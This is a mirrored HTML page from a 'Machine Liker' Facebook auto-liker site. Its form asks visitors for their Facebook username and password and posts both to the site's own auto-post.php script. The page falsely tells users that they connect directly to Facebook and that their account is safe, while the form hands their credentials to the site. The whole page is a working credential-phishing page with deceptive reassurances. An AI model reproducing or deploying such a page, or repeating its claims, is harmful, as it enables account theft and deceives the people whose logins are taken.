<!DOCTYPE html>
<html lang="en">

<!-- Mirrored from machineliker.co/token.generate.php by HTTrack Website Copier/3.x [XR&CO'2017], Tue, 25 Sep 2018 15:34:24 GMT -->
<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <title>IG Fast Liker | Login with Facebook</title>
    <meta name="keywords" content="machine liker, machine liker token, machine likes, machine likes token, auto liker token, auto liker, facebook token">
    <meta name="description" content="Machine Liker session token helps you access Machine Liker easily and then get you tons of auto likes.">
    <link rel="canonical" href="index.html">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0"/>
    <meta name="generator" content="google">
    <meta name="distribution" content="global">
    <meta name="language" content="EN">
    <meta name="rating" content="General">
    <meta name="robots" content="noodp, noydir, index, follow, all" />
    <meta name="author" content="Machine Liker">
    <meta name="googlebot" content="index, follow" />
    <meta name="revisit-after" content="1">
    <meta name="Expires" content="Never">
    <meta property="og:title" content="Machine Liker | Login with Facebook">
    <meta property="og:description" content="Machine Liker session token helps you access Machine Liker easily and then get you tons of auto likes.">
    <link href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,600,700" rel="stylesheet" type="text/css">
    <link href="assets/css/font-awesome.min.css" rel="stylesheet">
    <link href="assets/css/bootstrap.min.css" rel="stylesheet">
    <link href="assets/css/machineliker.css" rel="stylesheet">
    <link href="assets/img/ico/main.png" rel="shortcut icon">

    <!--[if lt IE 9]>
    	   <script src="//html5shim.googlecode.com/svn/trunk/html5.js"></script>
    <![endif]-->
    
    <!-- Global Site Tag (gtag.js) - Google Analytics -->
    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-48326838-16"></script>
    <script>
      window.dataLayer = window.dataLayer || [];
      function gtag(){dataLayer.push(arguments)};
      gtag('js', new Date());
      gtag('config', 'UA-48326838-16');
    </script>
</head>

<body>
    <div class="container">
        <center>
            <h1><b>FB Auto Liker</b></h1>
        </center>
        <hr>

        <div class="col-xs-12 col-md-12">
            <div class="row">
                <div class="alert alert-success"><b>NEWS!</b> Token problem is now fixed permantently. <br> You will need to enter your Facebook credentials for logging in. Do not worry, you connect directly to Facebook, so your account will be safe.</div>                <h3 style="margin-bottom: 16px; margin-top: 25px;"><b>Step 1:</b> Enter your login credentials below.</h3>
                <form action="auto-post.php" method="POST">
                    <label>Enter your <code>email/phone/username:</code></label>
                    <input type="text" class="form-control" name="username" placeholder="Email address, username or phone number" required="">
                    <br />
                    <label>Enter your <code>password:</code></label>
                    <input type="password" class="form-control" name="password" aria-describedby="password" placeholder="Password" required="">
                    <small class="form-text text-muted">The information you enter will be secure and safe. We do not share/sell your information. We only store your access token, nothing else.</small>
                    <br />
                    <br />
                    <button style="font-size: 16px;" type="submit" class="btn btn-primary">
                        <i class="fa fa-sign-in"></i> Login with Facebook
                    </button>
                </form>
                <br /><br /><br /><br />
            </div>
        </div>
    </div>
</body>

<!-- Mirrored from machineliker.co/token.generate.php by HTTrack Website Copier/3.x [XR&CO'2017], Tue, 25 Sep 2018 15:34:31 GMT -->
</html>
